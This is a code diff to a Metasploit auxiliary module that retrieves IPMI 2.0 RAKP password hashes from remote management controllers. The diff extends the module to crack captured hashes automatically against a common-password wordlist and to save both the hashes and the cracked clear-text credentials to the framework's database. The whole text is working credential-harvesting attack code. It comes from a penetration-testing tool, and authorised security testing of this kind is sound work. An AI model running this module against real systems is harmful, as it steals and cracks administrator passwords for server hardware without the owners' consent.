@@ -17,7 +17,12 @@ class Metasploit3 < Msf::Auxiliary
 	def initialize
 		super(
 			'Name'        => 'IPMI 2.0 RAKP Remote Password Hash Retreival',
-			'Description' => 'Identify valid usernames and their hashed passwords through the IPMI 2.0 RAKP protocol',
+			'Description' => %q|
+				This module identifies IPMI 2.0 compatible systems and attempts to retrieve the 
+				HMAC-SHA1 password hashes of default usernames. The hashes can be stored in a 
+				file using the OUTPUT_FILE option and then cracked using hmac_sha1_crack.rb
+				in the tools subdirectory as well hashcat (cpu) 0.46 or newer using type 7300.
+				|,
 			'Author'      => [ 'Dan Farmer <zen[at]fish2.com>', 'hdm' ],
 			'License'     => MSF_LICENSE,
 			'References'  => 
@@ -33,7 +38,11 @@ class Metasploit3 < Msf::Auxiliary
 			OptPath.new('USER_FILE', [ true, "File containing usernames, one per line",
 				File.join(Msf::Config.install_root, 'data', 'wordlists', 'ipmi_users.txt')
 			]),
-			OptString.new('OUTPUT_FILE', [false, "File to save captured password hashes into"])
+			OptPath.new('PASS_FILE', [ true, "File containing common passwords for offline cracking, one per line",
+				File.join(Msf::Config.install_root, 'data', 'wordlists', 'ipmi_passwords.txt')
+			]),			
+			OptString.new('OUTPUT_FILE', [false, "File to save captured password hashes into"]),
+			OptBool.new('CRACK_COMMON', [true, "Automatically crack common passwords as they are obtained", true])
 		], self.class)
 
 	end
@@ -109,12 +118,13 @@ class Metasploit3 < Msf::Auxiliary
 			end
 
 			if rakp.error_code != 0
-				vprint_status("#{rhost} Returned error code #{rakp.error_code} for username #{username}: #{Rex::Proto::IPMI::RMCP_ERRORS[rakp.error_code].to_s}")
+				vprint_error("#{rhost} Returned error code #{rakp.error_code} for username #{username}: #{Rex::Proto::IPMI::RMCP_ERRORS[rakp.error_code].to_s}")
 				next
 			end
 
+			# TODO: Finish documenting this error field
 			if rakp.ignored1 != 0
-				vprint_status("#{rhost} Returned weird error code #{rakp.ignored1} for username #{username}")
+				vprint_error("#{rhost} Returned error code #{rakp.ignored1} for username #{username}")
 				next
 			end
 
@@ -129,20 +139,60 @@ class Metasploit3 < Msf::Auxiliary
 				username
 			)
 
-			found = "#{rhost} #{username}:#{hmac_buffer.unpack("H*")[0]}:#{rakp.hmac_sha1.unpack("H*")[0]}"
+			found = "#{rhost} Hash #{username}:#{hmac_buffer.unpack("H*")[0]}:#{rakp.hmac_sha1.unpack("H*")[0]}"
 			print_good(found)
+
+			# Write the rakp hash to the output file 
 			if @output
 				@output.write(found + "\n")
+			end
+
+			# Write the rakp hash to the database
+			report_auth_info(
+				:host	=> rhost,
+				:port   => rport,
+				:proto  => 'udp',
+				:sname	=> 'ipmi',
+				:user 	=> username,
+				:pass   => "#{hmac_buffer.unpack("H*")[0]}:#{rakp.hmac_sha1.unpack("H*")[0]}",
+				:source_type => "captured",
+				:active => true,
+				:type   => 'rakp_hmac_sha1_hash'
+			)
+
+			# Offline crack common passwords and report clear-text credentials
+			next unless datastore['CRACK_COMMON']
+
+			::File.open(datastore['PASS_FILE'], "rb") do |pfd|
+				passwords = pfd.read(pfd.stat.size).split("\n")
+				passwords << ""
+				passwords.uniq.each do |pass|
+					pass = pass.strip
+					next unless pass.length > 0
+					next unless Rex::Proto::IPMI::Utils.verify_rakp_hmac_sha1(hmac_buffer, rakp.hmac_sha1, pass)
+					print_good("#{rhost} Hash for user '#{username}' matches password '#{pass}'")
+
+					# Report the clear-text credential to the database
+					report_auth_info(
+						:host	=> rhost,
+						:port   => rport,
+						:proto  => 'udp',
+						:sname	=> 'ipmi',
+						:user 	=> username,
+						:pass   => pass,
+						:source_type => "cracked",
+						:active => true,
+						:type   => 'password'
+					)
+					break
+				end
 			end
 		end
 	end
 
 	def process_getchannel_reply(data, shost, sport)
-
 		shost = shost.sub(/^::ffff:/, '')
-
 		info = Rex::Proto::IPMI::Channel_Auth_Reply.new(data) rescue nil
-
 
 		# Ignore invalid responses
 		return if not info
@@ -150,16 +200,17 @@ class Metasploit3 < Msf::Auxiliary
 
 		banner = info.to_banner
 
-		print_status("#{shost}:#{datastore['RPORT']} #{banner}")
+		print_status("#{shost} #{banner}")
 
 		report_service(
-			:host  => shost,
-			:port  => datastore['RPORT'],
+			:host  => rhost,
+			:port  => rport,
 			:proto => 'udp',
 			:name  => 'ipmi',
 			:info  => banner
 		)
 
+		# TODO:
 		# Report a vulnerablity if info.ipmi_user_anonymous has been set
 		# Report a vulnerability if ipmi 2.0 and kg is set to default
 		# Report a vulnerability if info.ipmi_user_null has been set (null username)
@@ -183,9 +234,22 @@ class Metasploit3 < Msf::Auxiliary
 		info
 	end
 
+	def setup
+		super
+		@output = nil
+		if datastore['OUTPUT_FILE']
+			@output = ::File.open(datastore['OUTPUT_FILE'], "ab")
+		end
+	end
+
+	def cleanup
+		super
+		@output.close if @output
+		@output = nil
+	end
 
 	#
-	# Helper methods (this didn't quite fit with existing mixins)
+	# Helper methods (these didn't quite fit with existing mixins)
 	#
 
 	attr_accessor :udp_sock
@@ -202,20 +266,6 @@ class Metasploit3 < Msf::Auxiliary
 	def udp_recv(timeo)
 		r = udp_sock.recvfrom(65535, timeo)
 		r[1] ? r : nil
-	end
-
-	def setup
-		super
-		@output = nil
-		if datastore['OUTPUT_FILE']
-			@output = ::File.open(datastore['OUTPUT_FILE'], "ab")
-		end
-	end
-
-	def cleanup
-		super
-		@output.close if @output
-		@output = nil
 	end
 
 	def rhost
